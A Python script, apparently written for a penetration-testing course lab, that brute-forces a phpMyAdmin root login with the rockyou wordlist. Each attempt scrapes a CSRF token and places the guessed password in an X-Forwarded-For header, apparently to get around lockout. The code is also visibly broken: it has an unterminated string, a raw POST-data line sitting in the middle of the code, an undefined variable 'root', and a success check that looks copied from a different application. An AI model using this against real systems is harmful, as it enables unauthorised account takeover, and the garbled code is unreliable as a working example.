#!/usr/bin/env python3
import re
import requests
import sys
import argparse

#initialisation of variables
host = 'http://10.11.1.71'
login_url = host + '/phpmyadmin/'
username = 'root
wordlist = []
filePath = "/usr/share/wordlists/rockyou.txt" # home/kali/Documents/pwk_lp1/mutated2.txt


# Reading input
parser = argparse.ArgumentParser()
parser.add_argument("--url", "-u", help="set target url")
parser.add_argument("--file", "-f", help="set passwords file")
args = parser.parse_args()

# Check args
if args.url:
    print("Set full url to " + args.url)
    login_url = args.url
    
if args.file:
    print("Set file to " + args.file)
    filePath = args.file
    


# Parsing words out of file 
f=open(filePath,"r")
lines=f.readlines()

# Generate passwords our of file
for pw in lines:
    wordlist.append(pw)
f.close()

# iterating over passwords
for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)

    # <input type="hidden" name="token" value="bf11860f7115af1d5e11e58c56f220ec">
    csrf_token = re.search('input.+?name="token".+?value="(.+?)"', login_page.text).group(1)
    # removing new line char
    password = password.rstrip()
    print('[*] Trying pw: "{p}"'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    pma_username=root&pma_password=benito&server=1&target=index.php&lang=en&collation_connection=utf8_general_ci&token=bf11860f7115af1d5e11e58c56f220ec

    data = {
        'tokenCSRF': csrf_token,
        'pma_username': root,
        'pma_password': password,
        'save': '',
        'server': 1,
        
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
